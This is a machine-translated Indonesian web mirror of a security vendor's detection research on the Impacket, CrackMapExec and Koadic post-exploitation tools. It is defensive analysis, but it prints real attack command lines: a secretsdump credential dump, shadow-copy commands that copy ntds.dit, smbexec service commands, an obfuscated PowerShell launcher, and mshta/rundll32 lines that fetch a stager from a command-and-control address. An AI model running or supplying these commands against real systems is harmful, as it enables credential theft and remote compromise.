<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>‚öôÔ∏è ‚úàÔ∏è üíÑ Cara mendeteksi serangan pada infrastruktur Windows: menjelajahi alat peretas üßóüèº üéÖüèº üìé</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Jumlah serangan di sektor korporasi meningkat setiap tahun: misalnya, pada 2017, 13% lebih banyak insiden unik dicatat dibandingkan pada 2016, dan pad...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Cara mendeteksi serangan pada infrastruktur Windows: menjelajahi alat peretas</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pt/blog/460517/"> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><img src="https://habrastorage.org/webt/qm/kv/ra/qmkvra9qmrta93tfbev2d6pdm7k.png"></a> <br><br>  Jumlah serangan di sektor korporasi meningkat setiap tahun: misalnya, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">pada 2017, 13% lebih banyak insiden unik dicatat</a> dibandingkan pada 2016, dan pada akhir 2018, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">27% lebih banyak insiden</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">dicatat</a> daripada pada periode sebelumnya.  Termasuk yang mana alat kerja utamanya adalah sistem operasi Windows.  Pada 2017-2018, APT Dragonfly, APT28, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">kelompok MuddyWater APT</a> menyerang organisasi pemerintah dan militer di Eropa, Amerika Utara, dan Arab Saudi.  Dan mereka menggunakan tiga alat untuk ini - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Impacket</a> , <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">CrackMapExec</a> dan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Koadic</a> .  Kode sumber mereka terbuka dan tersedia di GitHub. <br><br>  Perlu dicatat bahwa alat-alat ini tidak digunakan untuk penetrasi awal, tetapi untuk pengembangan serangan dalam infrastruktur.  Penyerang menggunakannya pada berbagai tahap serangan, mengikuti setelah mengatasi perimeter.  Omong-omong, ini sulit untuk dideteksi dan seringkali hanya dengan bantuan teknologi untuk <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mengidentifikasi jejak kompromi dalam lalu lintas jaringan</a> atau alat yang dapat <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mendeteksi tindakan aktif penyerang setelah ia menembus infrastruktur</a> .  Alat ini menyediakan banyak fungsi - dari mentransfer file hingga berinteraksi dengan registri dan menjalankan perintah pada mesin jarak jauh.  Kami melakukan studi tentang alat-alat ini untuk menentukan aktivitas jaringan mereka. <a name="habracut"></a><br><br>  Apa yang perlu kami lakukan: <br><br><ul><li>  <b>Memahami cara kerja alat peretasan</b> .  Cari tahu apa yang dibutuhkan penyerang untuk beroperasi dan teknologi apa yang dapat mereka gunakan. </li><li> <b>Temukan apa yang tidak terdeteksi oleh alat keamanan informasi di tahap pertama serangan</b> .  Tahap intelijen dapat dilewati, baik karena penyerang adalah penyerang internal, atau karena penyerang memanfaatkan celah dalam infrastruktur yang sebelumnya tidak diketahui.  Ada peluang untuk memulihkan seluruh rangkaian tindakannya, karenanya keinginan untuk mendeteksi gerakan lebih lanjut. </li><li>  <b>Menghilangkan alarm palsu dari alat deteksi intrusi</b> .  Kita tidak boleh lupa bahwa ketika mendeteksi tindakan tertentu atas dasar kecerdasan saja, sering terjadi kesalahan.  Biasanya dalam infrastruktur ada sejumlah cara yang memadai, tidak dapat dibedakan dari pandangan pertama yang sah, untuk mendapatkan informasi. </li></ul><br>  Apa yang diberikan alat ini kepada penyerang?  Jika ini adalah Impacket, maka penyerang mendapatkan perpustakaan besar modul yang dapat digunakan pada berbagai tahap serangan, mengikuti penetrasi.  Banyak alat menggunakan modul Impacket di dalam diri mereka - misalnya, Metasploit.  Ini memiliki dcomexec dan wmiexec untuk eksekusi perintah jarak jauh, secretsdump untuk mengambil akun dari memori yang ditambahkan dari Impacket.  Akibatnya, deteksi yang benar atas aktivitas perpustakaan semacam itu juga akan memastikan deteksi turunannya. <br><br>  Tentang CrackMapExec (atau hanya CME), pencipta secara kebetulan menulis "Didukung oleh Impacket".  Selain itu, CME memiliki fungsionalitas siap pakai untuk skenario populer: ini adalah Mimikatz untuk menerima kata sandi atau hash mereka, dan penerapan Meterpreter atau agen Empire untuk eksekusi jarak jauh, dan Bloodhound di kapal. <br><br>  Alat ketiga yang kami pilih adalah Koadic.  Ini cukup segar, dipresentasikan pada konferensi hacker internasional DEFCON 25 pada tahun 2017 dan memiliki pendekatan non-standar: bekerja melalui HTTP, Java Script dan Microsoft Visual Basic Script (VBS).  Pendekatan ini disebut hidup dari tanah: alat ini menggunakan seperangkat dependensi dan pustaka yang dibangun ke dalam Windows.  Pembuatnya menyebutnya COM Command Control, atau C3. <br><br><h2>  IMPACKET </h2><br>  Fungsionalitas Impacket sangat luas, mulai dari pengintaian di dalam AD dan mengumpulkan data dari server MS SQL internal, diakhiri dengan teknik untuk memperoleh kredensial: ini adalah serangan relai SMB dan menerima file ntds.dit yang berisi hash kata sandi pengguna dari pengontrol domain.  Impacket juga mengeksekusi perintah dari jarak jauh menggunakan empat metode berbeda: melalui WMI, layanan untuk mengelola Windows scheduler, DCOM dan SMB, dan untuk ini diperlukan kredensial. <br><br><h3>  Secretsdump </h3><br>  Mari kita lihat secretsdump.  Ini adalah modul yang tujuannya dapat berupa mesin pengguna dan pengontrol domain.  Dengan menggunakannya, Anda bisa mendapatkan salinan area memori LSA, SAM, SECURITY, NTDS.dit, sehingga dapat dilihat pada berbagai tahap serangan.  Langkah pertama dalam pengoperasian modul adalah otentikasi melalui SMB, yang memerlukan kata sandi pengguna atau hash-nya untuk secara otomatis melakukan serangan Pass the Hash.  Berikutnya adalah permintaan untuk membuka akses ke Service Control Manager (SCM) dan mendapatkan akses ke registri menggunakan protokol winreg, menggunakan mana penyerang dapat mengetahui data cabang yang menarik baginya dan mendapatkan hasil melalui SMB. <br><br>  Dalam gbr.  1 kita melihat bagaimana tepatnya ketika menggunakan akses protokol winreg diperoleh dengan mendaftarkan kunci dengan LSA.  Untuk melakukan ini, gunakan perintah DCERPC dengan opcode 15 - OpenKey. <br><br><img src="https://habrastorage.org/webt/28/g3/uf/28g3ufutlahahdolf8mne9sa4q4.png"><br>  <i>Fig.</i>  <i>1. Membuka kunci registri menggunakan protokol winreg</i> <br><br>  Selanjutnya, ketika akses kunci diperoleh, nilai-nilai disimpan menggunakan perintah SaveKey dengan opcode 20. Impacket membuat ini sangat spesifik.  Ini menyimpan nilai ke file yang namanya adalah string 8 karakter acak dengan penambahan .tmp.  Selain itu, pembongkaran lebih lanjut dari file ini terjadi melalui SMB dari direktori System32 (Gbr. 2). <br><br><img src="https://habrastorage.org/webt/v8/o-/56/v8o-56ycynu817pivdpr65jvtk8.png"><br>  <i>Fig.</i>  <i>2. Skema untuk mendapatkan kunci registri dari mesin jarak jauh</i> <br><br>  Ternyata Anda dapat mendeteksi aktivitas seperti itu di jaringan dengan menanyakan cabang registry tertentu menggunakan protokol winreg, nama tertentu, perintah, dan urutannya. <br><br>  Modul ini juga meninggalkan jejak di log peristiwa Windows, yang karenanya mudah dideteksi.  Misalnya, sebagai hasil dari perintah <br><br><pre><code class="bash hljs">secretsdump.py -debug -system SYSTEM -sam SAM -ntds NTDS -security SECURITY -bootkey BOOTKEY -outputfile 1.txt -use-vss -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span>-method mmcexec -user-status -dc-ip 192.168.202.100 -target-ip 192.168.202.100 contoso/Administrator:@DC</code> </pre> <br>  di log Windows Server 2016, kita akan melihat urutan peristiwa berikut: <br><br>  1. 4624 - Logon jarak jauh. <br>  2. 5145 - verifikasi hak akses ke layanan winreg jarak jauh. <br>  3. 5145 - memeriksa izin file di direktori System32.  File tersebut memiliki nama acak yang disebutkan di atas. <br>  4. 4688 - membuat proses cmd.exe yang meluncurkan vssadmin: <br><br><pre> <code class="bash hljs">‚ÄúC:\windows\system32\cmd.exe<span class="hljs-string"><span class="hljs-string">" /Q /c echo c:\windows\system32\cmd.exe /C vssadmin list shadows ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</span></span></code> </pre> <br>  5. 4688 - membuat proses dengan perintah: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  6. 4688 - membuat proses dengan perintah: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\NTDS\ntds.dit %SYSTEMROOT%\Temp\rmumAfcn.tmp ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  7. 4688 - membuat proses dengan perintah: <br><br><pre> <code class="bash hljs"><span class="hljs-string"><span class="hljs-string">"C:\windows\system32\cmd.exe"</span></span> /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> c:\windows\system32\cmd.exe /C vssadmin delete shadows /For=C: /Quiet ^&gt; %SYSTEMROOT%\Temp\__output &gt; %TEMP%\execute.bat &amp; c:\windows\system32\cmd.exe /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br><h3>  Smbexec </h3><br>  Seperti banyak alat pasca eksploitasi, Impacket memiliki modul untuk eksekusi perintah jarak jauh.  Kami akan fokus pada smbexec, yang menyediakan shell interaktif pada mesin jarak jauh.  Modul ini juga memerlukan otentikasi SMB dengan kata sandi atau hash-nya.  Dalam gbr.  3 kita melihat contoh bagaimana alat tersebut bekerja, dalam hal ini adalah konsol administrator lokal. <br><br><img src="https://habrastorage.org/webt/65/dx/os/65dxos1pwb3v9sy457qqqcasjzi.png"><br>  <i>Fig.</i>  <i>3. Konsol Interaktif Smbexec</i> <br><br>  Langkah pertama dalam smbexec setelah otentikasi adalah membuka SCM dengan perintah OpenSCManagerW (15).  Permintaan ini patut diperhatikan: di dalamnya, bidang MachineName diatur ke DUMMY. <br><br><img src="https://habrastorage.org/webt/rr/ob/go/rrobgonzydm5evu36sxa3awiw0k.png"><br>  <i>Fig.</i>  <i>4. Permintaan untuk membuka Manajer Kontrol Layanan</i> <br><br>  Selanjutnya, layanan dibuat menggunakan perintah CreateServiceW (12).  Dalam kasus smbexec, kita dapat melihat logika membangun tim yang sama setiap kali.  Dalam gbr.  5 hijau menunjukkan parameter perintah yang tidak berubah-ubah, kuning - apa yang dapat diubah oleh penyerang.  Sangat mudah untuk memperhatikan bahwa nama file yang dapat dieksekusi, direktori dan file output dapat diubah, tetapi sisanya dapat diubah jauh lebih sulit tanpa melanggar logika modul Impacket. <br><br><img src="https://habrastorage.org/webt/in/na/fo/innafo8sq7hwikto5cli9sv9-ow.png"><br>  <i>Fig.</i>  <i>5. Permintaan untuk membuat layanan menggunakan Service Control Manager</i> <br><br>  Smbexec juga meninggalkan jejak yang jelas di log peristiwa Windows.  Dalam log Windows Server 2016 untuk shell interaktif dengan perintah ipconfig, kita akan melihat urutan peristiwa berikut: <br><br>  1. 4697 - pemasangan layanan pada mesin korban: <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cd</span></span> ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  2. 4688 - pembuatan proses cmd.exe dengan argumen dari paragraf 1. <br>  3. 5145 - memeriksa izin pada file __output di direktori C $. <br>  4. 4697 - pemasangan layanan pada mesin korban. <br><br><pre> <code class="bash hljs">%COMSPEC% /Q /c <span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> ipconfig ^&gt; \\127.0.0.1\C$\__output 2^&gt;^&amp;1 &gt; %TEMP%\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\execute.bat &amp; del %TEMP%\execute.bat</code> </pre> <br>  5. 4688 - membuat proses cmd.exe dengan argumen dari paragraf 4. <br>  6. 5145 - memeriksa hak akses ke file __output di direktori C $. <br><br>  Impacket adalah dasar untuk mengembangkan alat serangan.  Ini mendukung hampir semua protokol dalam infrastruktur Windows dan pada saat yang sama memiliki karakteristiknya sendiri.  Berikut adalah permintaan winreg tertentu, dan penggunaan API SCM dengan karakteristik pembentukan perintah, dan format nama file, dan SMB share SYSTEM32. <br><br><h2>  CRACKMAPEXEC </h2><br>  Alat CME dirancang terutama untuk mengotomatisasi tindakan-tindakan rutin yang harus dilakukan penyerang untuk maju dalam jaringan.  Ini memungkinkan Anda untuk bekerja bersama dengan agen Empire yang terkenal dan Meterpreter.  Untuk menjalankan perintah secara terselubung, CME dapat mengaburkannya.  Menggunakan Bloodhound (alat intelijen terpisah), penyerang dapat mengotomatiskan pencarian untuk sesi administrator domain aktif. <br><br><h3>  Anjing pelacak </h3><br>  Bloodhound sebagai alat independen memungkinkan untuk kecerdasan canggih dalam jaringan.  Itu mengumpulkan data tentang pengguna, mesin, grup, sesi dan datang dalam bentuk skrip di PowerShell atau file biner.  Protokol berbasis LDAP atau SMB digunakan untuk mengumpulkan informasi.  Modul integrasi CME memungkinkan Anda untuk mengunduh Bloodhound ke mesin korban, menjalankan dan menerima data yang dikumpulkan setelah eksekusi, dengan demikian mengotomatiskan tindakan dalam sistem dan membuatnya kurang terlihat.  Shell grafis Bloodhound menyajikan data yang dikumpulkan dalam bentuk grafik, yang memungkinkan Anda menemukan jalur terpendek dari mesin penyerang ke administrator domain. <br><br><img src="https://habrastorage.org/webt/5g/b6/xm/5gb6xmpsvew_hmxv_j_e6z89nec.png"><br>  <i>Fig.</i>  <i>6. Antarmuka Bloodhound</i> <br><br>  Untuk berjalan di mesin korban, modul membuat tugas menggunakan ATSVC dan SMB.  ATSVC adalah antarmuka untuk bekerja dengan Penjadwal Tugas Windows.  CME menggunakan fungsi NetrJobAdd (1) untuk membuat tugas melalui jaringan.  Contoh dari apa yang dikirim modul CME ditunjukkan pada gambar.  7: Ini adalah panggilan ke cmd.exe dan kode yang dikaburkan sebagai argumen dalam format XML. <br><br><img src="https://habrastorage.org/webt/h1/ft/_t/h1ft_tmh38cii_onpk6k4dydd10.png"><br>  <i>Gbr. 7.</i>  <i>Membuat tugas melalui CME</i> <br><br>  Setelah tugas selesai, mesin korban meluncurkan Bloodhound itu sendiri, dan ini bisa dilihat di lalu lintas.  Modul ini ditandai dengan permintaan LDAP untuk menerima grup standar, daftar semua mesin dan pengguna di domain, menerima informasi tentang sesi pengguna aktif melalui permintaan SRVSVC NetSessEnum. <br><br><img src="https://habrastorage.org/webt/pm/i3/5a/pmi35abw7jc1vjo-zrexijzhqks.png"><br>  <i>Fig.</i>  <i>8. Mendapatkan daftar sesi aktif melalui SMB</i> <br><br>  Selain itu, peluncuran Bloodhound pada mesin korban dengan audit diaktifkan disertai dengan acara dengan ID 4688 (pembuatan proses) dan nama proses <code>¬´C:\Windows\System32\cmd.exe¬ª</code> .  Yang perlu diperhatikan di dalamnya adalah argumen baris perintah: <br><br><pre> <code class="bash hljs">cmd.exe /Q /c powershell.exe -<span class="hljs-built_in"><span class="hljs-built_in">exec</span></span> bypass -noni -nop -w 1 -C <span class="hljs-string"><span class="hljs-string">" &amp; ( </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$eNV</span></span></span><span class="hljs-string">:cOmSPEc[4,26,25]-JOiN'')( [chAR[]](91 , 78, 101,116 , 46, 83 , 101 , ‚Ä¶ , 40,41 )-jOIN'' ) "</span></span></code> </pre> <br><h3>  Enum_avproducts </h3><br>  Dari sudut pandang fungsionalitas dan implementasi, modul enum_avproducts sangat menarik.  WMI memungkinkan menggunakan bahasa query WQL untuk menerima data dari berbagai objek Windows, yang pada dasarnya adalah apa yang menggunakan modul CME ini.  Ini menghasilkan permintaan ke kelas AntiSpywareProduct dan AntiMirusProduct tentang perlindungan yang dipasang di mesin korban.  Untuk mendapatkan data yang diperlukan, modul terhubung ke namespace root \ SecurityCenter2, kemudian menghasilkan kueri WQL dan menerima respons.  Dalam gbr.  Gambar 9 menunjukkan isi permintaan dan tanggapan tersebut.  Dalam contoh kami, Windows Defender ditemukan. <br><br><img src="https://habrastorage.org/webt/qs/lx/i5/qslxi5tarfkx3quxppml3vcgudm.png"><br>  <i>Fig.</i>  <i>9. Aktivitas jaringan modul enum_avproducts</i> <br><br>  Seringkali, audit WMI (Lacak Aktivitas WMI), di mana Anda dapat menemukan informasi yang berguna tentang kueri WQL, dapat dimatikan.  Tetapi jika diaktifkan, jika skrip enum_avproducts dijalankan, acara dengan ID 11 akan disimpan. Ini akan berisi nama pengguna yang mengirim permintaan dan nama di root \ SecurityCenter2 namespace. <br><br>  Setiap modul CME mengungkapkan artefak mereka sendiri, apakah itu pertanyaan WQL spesifik atau pembuatan jenis tugas tertentu dalam penjadwal tugas dengan kebingungan dan aktivitas tipikal untuk Bloodhound di LDAP dan SMB. <br><br><h2>  Koadic </h2><br>  Fitur khas Koadic adalah penggunaan interpreter Windows JavaScript dan VBScript bawaan.  Dalam hal ini, ia mengikuti tren hidup di luar negeri - yaitu, ia tidak memiliki ketergantungan eksternal dan menggunakan alat Windows standar.  Ini adalah alat untuk Command &amp; Control (CnC) penuh, karena setelah infeksi, "implan" dipasang pada mesin, yang memungkinkannya dikendalikan.  Mesin seperti itu, dalam terminologi Koadic, disebut "zombie."  Dengan kurangnya hak istimewa untuk pekerjaan penuh di sisi korban, Koadic memiliki kemampuan untuk membesarkan mereka menggunakan teknik bypass UAC. <br><br><img src="https://habrastorage.org/webt/z7/lp/e9/z7lpe96_xft7qv9xvusq-4uzukm.png"><br>  <i>Fig.</i>  <i>10. Command Shell Koadic</i> <br><br>  Korban harus memulai komunikasi dengan server Command &amp; Control itu sendiri.  Untuk melakukan ini, ia perlu mengajukan permohonan untuk URI yang telah disiapkan sebelumnya dan mendapatkan badan Koadic utama menggunakan salah satu stager.  Dalam gbr.  11 menunjukkan contoh untuk stager mshta. <br><br><img src="https://habrastorage.org/webt/rg/sk/fu/rgskfuogt-22hdhlrn8553hi88k.png"><br>  <i>Fig.</i>  <i>11. Menginisialisasi sesi dengan server CnC</i> <br><br>  Menggunakan variabel respon WS, menjadi jelas bahwa eksekusi terjadi melalui WScript.Shell, dan variabel STAGER, SESSIONKEY, JOBKEY, JOBKEYPATH, EXPIRE berisi informasi kunci tentang parameter sesi saat ini.  Ini adalah pasangan permintaan-respons pertama dalam koneksi HTTP ke server CnC.  Permintaan selanjutnya terkait langsung dengan fungsi modul yang disebut (implan).  Semua modul Koadic hanya berfungsi dengan sesi aktif dengan CnC. <br><br><h3>  Mimikatz </h3><br>  Sama seperti CME bekerja dengan Bloodhound, Koadic bekerja dengan Mimikatz sebagai program mandiri dan memiliki beberapa cara untuk menjalankannya.  Di bawah ini adalah pasangan permintaan-respons untuk memuat implan Mimikatz. <br><br><img src="https://habrastorage.org/webt/d6/8m/4a/d68m4amrfwoylxnmm_o06auiucu.png"><br>  <i>Fig.</i>  <i>12. Transfer Mimikatz ke Koadic</i> <br><br>  Anda mungkin memperhatikan bagaimana format URI dalam permintaan telah berubah.  Di dalamnya muncul nilai variabel csrf, yang bertanggung jawab untuk modul yang dipilih.  Jangan memperhatikan namanya;  kita semua tahu bahwa CSRF biasanya dipahami secara berbeda.  Sebagai tanggapan, badan utama yang sama dari Koadic masuk, di mana kode yang terkait dengan Mimikatz ditambahkan.  Itu cukup besar, jadi pertimbangkan poin-poin utama.  Di depan kita adalah perpustakaan Mimikatz yang disandikan base64, kelas .NET berseri yang akan menyuntikkannya, dan argumen untuk menjalankan Mimikatz.  Hasil eksekusi ditransmisikan melalui jaringan secara jelas. <br><br><img src="https://habrastorage.org/webt/sg/ua/jx/sguajxxqyymj7sbhr3nwjism2pe.png"><br>  <i>Fig.</i>  <i>13. Hasil menjalankan Mimikatz pada mesin jarak jauh</i> <br><br><h3>  Exec_cmd </h3><br>  Koadic juga memiliki modul yang dapat menjalankan perintah dari jarak jauh.  Di sini kita akan melihat metode yang sama menghasilkan URI dan variabel akrab sid dan csrf.  Dalam kasus modul exec_cmd, kode ditambahkan ke badan yang mampu mengeksekusi perintah shell.  Kode berikut ditunjukkan dalam respons HTTP dari server CnC. <br><br><img src="https://habrastorage.org/webt/v7/3c/yw/v73cywsdkemyp0lsoemc0sn6ed4.png"><br>  <i>Fig.</i>  <i>14. Kode implan exec_cmd</i> <br><br>  Variabel GAWTUUGCFI dengan atribut WS yang akrab diperlukan untuk eksekusi kode.  Dengan bantuannya, implan memanggil shell, memproses dua cabang kode - shell.exec dengan kembalinya aliran data output dan shell.run tanpa kembali. <br><br>  Koadic bukan alat khas, tetapi memiliki artefak sendiri yang dapat ditemukan dalam lalu lintas yang sah: <br><br><ul><li>  pembentukan permintaan HTTP khusus, </li><li>  menggunakan winHttpRequests API, </li><li>  membuat objek WScript.Shell melalui ActiveXObject, </li><li>  tubuh dieksekusi besar. </li></ul><br>  Koneksi awal memulai pemasangan, sehingga dimungkinkan untuk mendeteksi aktivitasnya melalui peristiwa Windows.  Untuk mshta, ini adalah acara 4688, yang berbicara tentang membuat proses dengan atribut peluncuran: <br><br><pre> <code class="bash hljs">C:\Windows\system32\mshta.exe http://192.168.211.1:9999/dXpT6</code> </pre> <br>  Selama eksekusi Koadic, Anda dapat melihat 4688 acara lainnya dengan atribut yang menggambarkannya dengan sempurna: <br><br><pre> <code class="bash hljs">rundll32.exe http://192.168.241.1:9999/dXpT6?sid=1dbef04007a64fba83edb3f3928c9c6c; csrf=;\..\..\..\mshtml,RunHTMLApplication rundll32.exe http://192.168.202.136:9999/dXpT6?sid=12e0bbf6e9e5405690e5ede8ed651100;csrf=18f93a28e0874f0d8d475d154bed1983;\..\..\..\mshtml,RunHTMLApplication <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; net session 1&gt; C:\Users\user02\AppData\Local\Temp\6dc91b53-ddef-2357-4457-04a3c333db06.txt 2&gt;&amp;1 <span class="hljs-string"><span class="hljs-string">"C:\Windows\system32\cmd.exe"</span></span> /q /c chcp 437 &amp; ipconfig 1&gt; C:\Users\user02\AppData\Local\Temp\721d2d0a-890f-9549-96bd-875a495689b7.txt 2&gt;&amp;1</code> </pre> <br><h2>  Kesimpulan </h2><br>  Tren kehidupan dari tanah semakin populer di kalangan pengganggu.  Mereka menggunakan alat dan mekanisme Windows bawaan untuk kebutuhan mereka.  Kami melihat bagaimana alat Koadic, CrackMapExec, dan Impacket yang populer yang mengikuti prinsip ini semakin banyak ditemukan dalam laporan APT.  Jumlah garpu di GitHub untuk alat-alat ini juga terus bertambah, yang baru muncul (sekarang sudah ada sekitar seribu).  Tren ini mendapatkan popularitas karena kesederhanaannya: penyerang tidak membutuhkan alat pihak ketiga, mereka sudah berada di mesin korban dan membantu memotong alat perlindungan.  Kami fokus mempelajari konektivitas jaringan: setiap alat yang dijelaskan di atas meninggalkan jejak pada lalu lintas jaringan;  studi terperinci tentang mereka memungkinkan kami untuk mengajarkan produk kami <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PT Network Attack Discovery</a> untuk mendeteksi mereka, yang pada akhirnya membantu untuk menyelidiki seluruh rantai insiden cyber yang melibatkan mereka. <br><br>  <b>Penulis</b> : <br><br><ul><li>  Anton Tyurin, Kepala Layanan Ahli, Pusat Keamanan Pakar PT, Teknologi Positif </li><li>  Egor Podmokov, pakar, Pusat Pakar Keamanan PT, Teknologi Positif </li></ul></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id460517/">https://habr.com/ru/post/id460517/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id460507/index.html">XEN dan masa depan otomotif: bagaimana hypervisor open-source menjadi pesaing untuk solusi otomotif komersial</a></li>
<li><a href="../id460509/index.html">Bagaimana proxy penduduk membantu dalam bisnis: kasus nyata menggunakan Infatica dalam Penambangan Data</a></li>
<li><a href="../id460511/index.html">Penyesuaian PHP-FPM: menggunakan pm static untuk kinerja maksimum</a></li>
<li><a href="../id460513/index.html">Flutter 1.7 - apa yang baru dalam rilis 10 Juli 2019</a></li>
<li><a href="../id460515/index.html">Seberapa dekat kita dengan kedatangan robomobiles?</a></li>
<li><a href="../id460521/index.html">Petualangan Malvari yang Elusif, Bagian IV: Bidang Dokumen DDE dan Word</a></li>
<li><a href="../id460523/index.html">Pengumuman mitap yang dengan lancar berubah menjadi tempat minum BeerPHP (di Moskow dan online)</a></li>
<li><a href="../id460525/index.html">Selamat datang di DINS IT EVENING pada bulan Juli: QA dan JS</a></li>
<li><a href="../id460527/index.html">Pemecahan masalah dengan pwnable.kr 06 - acak dan 09 - kesalahan</a></li>
<li><a href="../id460531/index.html">Penasaran Penasaran dari Dunia IT - 5</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
